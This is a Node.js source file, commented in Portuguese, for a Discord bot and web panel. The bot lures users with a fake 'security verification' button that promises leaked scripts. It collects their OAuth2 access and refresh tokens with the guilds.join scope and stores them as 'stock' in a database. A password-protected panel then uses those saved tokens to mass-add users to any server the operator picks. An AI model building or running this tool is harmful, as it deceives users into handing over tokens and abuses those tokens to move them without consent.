require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET = 'https://discord.com/app'; 
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; // Senha para entrar no site

// --- SETUP DO BANCO (POSTGRES) ---
let pool = null;

async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({
            connectionString: process.env.DATABASE_URL,
            ssl: { rejectUnauthorized: false }
        });
        try {
            await pool.query(`
                CREATE TABLE IF NOT EXISTS auth_users (
                    id VARCHAR(255) PRIMARY KEY,
                    username VARCHAR(255),
                    access_token TEXT,
                    refresh_token TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            `);
            console.log('✅ Banco conectado e tabela verificada.');
        } catch (err) { console.error("❌ Erro no banco:", err); }
    }
}

const app = express();
// --- IMPORTANTE: ISSO PERMITE O SITE RECEBER DADOS DO FORMULÁRIO ---
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// =================================================================
// ÁREA DO SITE (WEB DASHBOARD)
// =================================================================

// 1. Rota Principal
app.get('/', async (req, res) => {
    let count = 0;
    if(pool) {
        try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {}
    }
    res.send(`
        <body style="background:#1e1f22;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column">
            <h1>🤖 Bot Online</h1>
            <p>Estoque Seguro: <b>${count}</b> usuários.</p>
            <a href="/painel" style="color:#5865F2;font-size:20px;text-decoration:none;border:1px solid #5865F2;padding:10px;border-radius:5px;">Acessar Painel de Envio</a>
        </body>
    `);
});

// 2. Rota do Painel (Aqui estava faltando!)
app.get('/painel', async (req, res) => {
    let count = 0;
    if(pool) {
        try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {}
    }

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Painel Admin</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background-color: #2b2d31; color: #f2f3f5; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding-top: 50px; }
                .container { background: #313338; padding: 40px; border-radius: 8px; width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
                h2 { color: #5865F2; text-align: center; margin-top: 0; }
                label { display: block; margin-top: 15px; font-weight: bold; color: #b5bac1; }
                input { width: 100%; padding: 10px; margin-top: 5px; background: #1e1f22; border: 1px solid #1e1f22; color: white; border-radius: 4px; box-sizing: border-box; }
                input:focus { outline: 2px solid #5865F2; }
                button { width: 100%; padding: 12px; margin-top: 25px; background: #23a559; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; }
                button:hover { background: #1a7f42; }
                .stats { text-align: center; margin-bottom: 20px; font-size: 14px; color: #949ba4; }
                .highlight { color: #fff; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>🎛️ Painel de Controle</h2>
                <div class="stats">Membros no Banco: <span class="highlight">${count}</span></div>
                
                <form action="/api/mass-join" method="POST">
                    <label>Senha de Admin</label>
                    <input type="password" name="password" required placeholder="Senha configurada no Render">

                    <label>ID do Servidor Destino</label>
                    <input type="text" name="serverId" required placeholder="O bot deve estar lá">

                    <label>Quantidade de Pessoas</label>
                    <input type="number" name="amount" required min="1" max="${count}" placeholder="Ex: 50">

                    <button type="submit">🚀 Iniciar Envio</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// 3. API que executa o envio (Backend do Painel)
app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;

    // Segurança
    if (!ADMIN_PASSWORD) return res.send('ERRO: Você não configurou a variável ADMIN_PASSWORD no Render.');
    if (password !== ADMIN_PASSWORD) return res.send('<h1 style="color:red">Senha Incorreta</h1><a href="/painel">Tentar de novo</a>');
    if (!pool) return res.send('Erro: Banco de dados desconectado.');

    // Busca usuários
    let users = [];
    try {
        const result = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]);
        users = result.rows;
    } catch(e) { return res.send('Erro ao buscar no banco.'); }

    if (users.length === 0) return res.send('Banco de dados vazio.');

    // Responde o site rápido para não travar
    res.send(`
        <body style="background:#2b2d31;color:white;font-family:sans-serif;text-align:center;padding-top:50px;">
            <h1 style="color:#23a559">✅ Comando Recebido!</h1>
            <p>O bot está enviando <b>${users.length}</b> usuários para o servidor <b>${serverId}</b> em segundo plano.</p>
            <p>Verifique o canal de logs no Discord para ver o relatório final.</p>
            <a href="/painel" style="color:#5865F2">Voltar</a>
        </body>
    `);

    // --- EXECUÇÃO EM BACKGROUND ---
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let sucesso = 0;
    let falha = 0;

    console.log(`[PAINEL] Iniciando envio de ${users.length} membros...`);

    for (const user of users) {
        try {
            await axios.put(
                `https://discord.com/api/guilds/${serverId}/members/${user.id}`,
                { access_token: user.access_token },
                { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
            );
            sucesso++;
        } catch (error) {
            if (error.response && error.response.status === 401) {
                // Token inválido (usuário revogou acesso), remove do banco
                pool.query('DELETE FROM auth_users WHERE id = $1', [user.id]).catch(()=>{});
            }
            falha++;
        }
        await sleep(1000); // 1 segundo de intervalo entre cada membro
    }

    // Manda Relatório no Discord
    const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (logChannel) {
        const embed = new EmbedBuilder()
            .setTitle('🖥️ Relatório do Painel Web')
            .setDescription(`**Destino:** \`${serverId}\`\n**Sucesso:** ${sucesso}\n**Falha:** ${falha}`)
            .setColor(falha > sucesso ? 'Red' : 'Green')
            .setTimestamp();
        logChannel.send({ embeds: [embed] });
    }
});

// 4. Rota Callback (OAuth2 para salvar usuários)
app.get('/callback', async (req, res) => {
    const { code, state } = req.query; 
    if (!code) return res.send('Erro: Falta código.');

    try {
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;

        if (pool) {
            await pool.query(`
                INSERT INTO auth_users (id, username, access_token, refresh_token)
                VALUES ($1, $2, $3, $4)
                ON CONFLICT (id) 
                DO UPDATE SET access_token = $3, refresh_token = $4;
            `, [user.id, user.username, access_token, refresh_token]);
        }

        // Tenta dar cargo
        let nomeServidor = "Desconhecido";
        let statusCargo = "Nenhum";
        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    nomeServidor = guild.name;
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                    if (member && role) {
                        await member.roles.add(role);
                        statusCargo = "Cargo Entregue";
                    }
                }
            } catch (e) {}
        }

        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embed = new EmbedBuilder()
                .setTitle('📥 Novo Token Salvo')
                .setDescription(`**Usuário:** ${user.username}\n**Origem:** ${nomeServidor}`)
                .setColor('Blue');
            logChannel.send({ embeds: [embed] });
        }

        // Página de Sucesso Bonita
        res.send(`<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verificado</title><style>body{background-color:#2b2d31;font-family:'Segoe UI',sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column}.card{background:#313338;padding:40px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.5);text-align:center;width:90%;max-width:400px}.icon{font-size:60px;margin-bottom:20px;animation:pop 0.5s ease}h1{margin:0 0 10px;font-size:24px}p{color:#b5bac1;margin-bottom:30px}.btn{background:#5865F2;color:white;padding:12px 30px;text-decoration:none;border-radius:5px;font-weight:bold;display:inline-block;transition:0.3s}.btn:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(88,101,242,0.4)}@keyframes pop{from{transform:scale(0)}to{transform:scale(1)}}</style></head><body><div class="card"><div class="icon">✅</div><h1>Acesso Liberado!</h1><p>Verificação concluída no servidor <b>${nomeServidor}</b>.</p><a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a></div></body></html>`);

    } catch (e) { console.error(e); res.send('Erro auth.'); }
});

// =================================================================
// ÁREA DO DISCORD (BOT)
// =================================================================
client.once('ready', async () => {
    console.log(`🤖 Bot Painel Logado: ${client.user.tag}`);
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Cria o painel de verificação' },
        { name: 'estoque', description: 'Ver quantidade salva no banco' }
    ]);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    if (interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        
        const embed = new EmbedBuilder()
            .setTitle('🛡️ Verificação de Segurança')
            .setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!')
            .setColor(0x5865F2)
            .setFooter({ text: 'Sistema seguro de Verificação' });

        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
        
        await interaction.channel.send({ embeds: [embed], components: [row] });
        interaction.reply({ content: 'Painel enviado.', ephemeral: true });
    }

    if (interaction.commandName === 'estoque') {
        let count = 0;
        if(pool) {
            try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {}
        }
        interaction.reply({ content: `📦 **Banco SQL:** ${count} usuários salvos.`, ephemeral: true });
    }
});

// --- INICIALIZAÇÃO ---
iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("Web Server + Painel Ligados"));
    client.login(process.env.BOT_TOKEN);
});
